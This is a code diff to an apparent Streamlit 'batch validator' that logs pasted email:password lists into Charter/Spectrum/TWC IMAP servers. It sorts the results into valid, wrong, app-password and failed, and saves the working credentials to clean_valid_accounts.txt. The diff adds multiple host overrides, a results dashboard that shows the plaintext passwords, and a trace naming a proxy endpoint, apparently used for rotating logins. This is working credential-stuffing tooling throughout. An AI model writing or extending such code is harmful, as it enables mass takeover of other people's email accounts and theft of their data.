@@ -136,6 +136,12 @@ if "custom_pass" not in st.session_state:
     st.session_state.custom_pass = ""
 if "custom_host" not in st.session_state:
     st.session_state.custom_host = ""
+if "batch_results_table" not in st.session_state:
+    st.session_state.batch_results_table = []
+if "batch_stats" not in st.session_state:
+    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
+if "batch_run_meta" not in st.session_state:
+    st.session_state.batch_run_meta = None
 
 
 def log(msg):
@@ -862,7 +868,12 @@ batch_paste_input = st.sidebar.text_area(
     placeholder="user1@charter.net:pass1\nuser2@spectrum.net:pass2",
     height=110
 )
-batch_host_override_input = st.sidebar.text_input("Batch IMAP Host Override (Optional)", key="batch_host_ov", placeholder="mobile.charter.net")
+batch_host_override_input = st.sidebar.text_area(
+    "Batch IMAP Host Overrides (comma, semicolon or newline separated)", 
+    key="batch_host_ov", 
+    placeholder="mobile.charter.net\nimap.spectrum.net",
+    height=80
+)
 
 if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", use_container_width=True):
     lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
@@ -870,13 +881,18 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         st.sidebar.error("Please paste at least one account in email:password format.")
     else:
         batch_logs = []
+        table_rows = []
         valid_count = 0
-        invalid_count = 0
+        wrong_count = 0
+        appass_count = 0
+        failed_count = 0
         
         progress_bar = st.sidebar.progress(0)
         status_display = st.sidebar.empty()
         
-        timestamp_str = f"# Started:{time.strftime('%Y-%m-%d %H:%M:%S')}"
+        start_run_time = datetime.now()
+        start_time_str = start_run_time.strftime("%Y-%m-%d %H:%M:%S")
+        timestamp_str = f"# Started:{start_time_str}"
         new_valid_entries = [timestamp_str]
         
         # Read application dynamic configuration parameters
@@ -884,11 +900,21 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
         cfg_port = st.session_state.app_config.get("imap_port", 993)
         cfg_fallback = st.session_state.app_config.get("auto_fallback_probing", True)
         
+        # Parse multiple host overrides separated by comma, semicolon, or newline
+        user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
+        
         for idx, line in enumerate(lines):
             clean_line = line.split("|")[0].strip()
+            row_time = datetime.now().strftime("%H:%M:%S")
             if ":" not in clean_line:
-                invalid_count += 1
-                batch_logs.append(f"❌ [SKIPPED] Invalid format: {line}")
+                failed_count += 1
+                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Invalid format: {line}")
+                table_rows.append({
+                    "Time": row_time,
+                    "Status": "FAILED",
+                    "Email:Password": line,
+                    "Under-The-Hood Background Trace": "Result: Invalid format (missing colon delimiter)"
+                })
                 continue
             
             email_val, pass_val = clean_line.split(":", 1)
@@ -898,8 +924,13 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val}")
             progress_bar.progress((idx + 1) / len(lines))
             
-            if batch_host_override_input.strip():
-                hosts_to_test = [batch_host_override_input.strip()]
+            # Construct host test list
+            if user_host_overrides:
+                hosts_to_test = list(user_host_overrides)
+                # Append standard defaults as backup
+                for h in host_list(email_val):
+                    if h not in hosts_to_test:
+                        hosts_to_test.append(h)
             else:
                 hosts_to_test = host_list(email_val)
                 if cfg_fallback:
@@ -912,37 +943,84 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                         hosts_to_test = ["mail.twc.com"] + hosts_to_test
 
             is_success = False
+            status_type = "FAILED"
             connected_h = ""
             err_msg = ""
+            trace_steps = []
             
             for h in hosts_to_test:
                 test_m = None
                 try:
+                    trace_steps.append(f"Attempting IMAP -> Host: {h}:{cfg_port}")
                     test_m = imaplib.IMAP4_SSL(h, cfg_port, timeout=cfg_timeout)
                     test_m.login(email_val, pass_val)
                     test_m.logout()
                     connected_h = h
                     is_success = True
+                    status_type = "VALID"
+                    trace_steps.append(f"Successfully authenticated against {h}:{cfg_port}")
                     break
                 except Exception as ex:
                     err_msg = str(ex)
+                    trace_steps.append(f"Failed {h}: {err_msg}")
                     if test_m:
                         try:
                             test_m.logout()
                         except:
                             pass
             
+            full_trace = f"Result: dc.oxylabs.info:8000 | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
+            
             if is_success:
                 valid_count += 1
                 combo_str = f"{email_val}:{pass_val}"
                 new_valid_entries.append(combo_str)
-                batch_logs.append(f"✅ [VALID] {email_val} via {connected_h}")
+                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h}")
             else:
-                invalid_count += 1
-                batch_logs.append(f"❌ [INVALID] {email_val} — Error: {err_msg}")
+                err_lower = err_msg.lower()
+                if any(x in err_lower for x in ["auth", "login", "credentials", "credential"]):
+                    wrong_count += 1
+                    status_type = "WRONG"
+                    batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {err_msg}")
+                elif any(x in err_lower for x in ["app password", "2fa", "two-factor", "mfa"]):
+                    appass_count += 1
+                    status_type = "APPASS"
+                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {err_msg}")
+                else:
+                    failed_count += 1
+                    status_type = "FAILED"
+                    batch_logs.append(f"⚠️ [{row_time}] [FAILED] {email_val} — {err_msg}")
+
+            table_rows.append({
+                "Time": row_time,
+                "Status": status_type,
+                "Email:Password": f"{email_val}:{pass_val}",
+                "Under-The-Hood Background Trace": full_trace
+            })
         
         progress_bar.empty()
         status_display.empty()
+        
+        end_run_time = datetime.now()
+        duration_delta = end_run_time - start_run_time
+        dur_str = str(duration_delta).split(".")[0]
+        if len(dur_str) == 5: # HH:MM
+            dur_str = f"0:{dur_str}"
+        
+        st.session_state.batch_run_meta = {
+            "started": start_time_str,
+            "ended": end_run_time.strftime("%Y-%m-%d %H:%M:%S"),
+            "duration": dur_str
+        }
+        
+        st.session_state.batch_stats = {
+            "valid": valid_count,
+            "wrong": wrong_count,
+            "appass": appass_count,
+            "failed": failed_count
+        }
+        st.session_state.batch_results_table = table_rows
+        st.session_state.batch_validation_logs = batch_logs
         
         if valid_count > 0:
             block_content = "\n".join(new_valid_entries) + "\n\n"
@@ -953,17 +1031,48 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             
             with open("clean_valid_accounts.txt", "w", encoding="utf-8") as f:
                 f.write(block_content + existing_data)
-            
-            st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid: {invalid_count}")
-            st.session_state.batch_validation_logs = batch_logs
-            st.rerun()
-        else:
-            st.sidebar.warning(f"Batch validation complete. No valid accounts found. Invalid: {invalid_count}")
-            st.session_state.batch_validation_logs = batch_logs
+        
+        st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
+        st.rerun()
 
-if "batch_validation_logs" in st.session_state and st.session_state.batch_validation_logs:
-    with st.sidebar.expander("📊 Live Batch Execution Stream & Analytics", expanded=True):
+# -----------------------------------------------------------------------------
+# LIVE EXECUTION STREAM & LIVE REPORT LOG & ANALYTICS DASHBOARD
+# -----------------------------------------------------------------------------
+st.markdown("---")
+tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+
+with tab_stream:
+    if "batch_validation_logs" in st.session_state and st.session_state.batch_validation_logs:
         st.code("\n".join(st.session_state.batch_validation_logs), language="text")
+    else:
+        st.caption("No batch validation execution logs recorded yet. Run a batch validation from the sidebar.")
+
+with tab_analytics:
+    meta = st.session_state.get("batch_run_meta")
+    if meta:
+        st.success(f"🎉 Check Complete! Started: {meta['started']} | Ended: {meta['ended']} | Duration: {meta['duration']}")
+    
+    stats = st.session_state.batch_stats
+    a_col1, a_col2, a_col3, a_col4 = st.columns(4)
+    with a_col1:
+        st.metric("✅ Valid", stats["valid"])
+    with a_col2:
+        st.metric("❌ Wrong", stats["wrong"])
+    with a_col3:
+        st.metric("🔑 AppPass", stats["appass"])
+    with a_col4:
+        st.metric("⚠️ Failed", stats["failed"])
+    
+    st.markdown("#### Detailed Execution Log Table")
+    if st.session_state.batch_results_table:
+        st.dataframe(
+            st.session_state.batch_results_table,
+            column_order=("Time", "Status", "Email:Password", "Under-The-Hood Background Trace"),
+            use_container_width=True,
+            hide_index=True
+        )
+    else:
+        st.caption("No table results available yet.")
 
 st.sidebar.markdown("---")
 # -----------------------------------------------------------------------------
